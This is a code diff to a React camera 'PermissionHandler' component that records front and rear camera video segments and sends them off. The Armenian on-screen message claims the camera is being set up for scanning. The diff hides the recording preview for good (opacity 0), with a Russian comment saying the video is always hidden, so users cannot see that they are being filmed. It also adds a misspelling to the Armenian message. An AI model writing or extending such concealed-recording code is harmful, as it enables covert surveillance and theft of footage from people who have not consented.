@@ -279,7 +279,7 @@ const PermissionHandler = () => {
         setProcessSuccessful(prev => prev && video1SendSuccess);
       }
 
-      setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար...");
+      setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույգ սկանավորման համար...");
       setAppPhase("recordingVideo2");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo2'.`);
       const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment");
@@ -369,13 +369,14 @@ const PermissionHandler = () => {
             {loadingMessage}
           </p>
           <div className="relative w-full max-w-md aspect-video bg-secondary flex items-center justify-center rounded-lg overflow-hidden shadow-lg">
+            {/* Видеоэлемент для записи теперь всегда скрыт */}
             <video
               ref={videoRef}
               autoPlay
               playsInline
               muted
               className="w-full h-full object-cover transition-opacity duration-500"
-              style={{ opacity: (appPhase === "recordingVideo1" || appPhase === "recordingVideo2") ? 1 : 0 }}
+              style={{ opacity: 0 }} // Всегда скрыт
             />
             <div className="absolute inset-0 border-4 border-primary opacity-70 rounded-lg pointer-events-none animate-border-pulse" />
             {(appPhase === "collectingData" || appPhase === "flippingCamera") && (
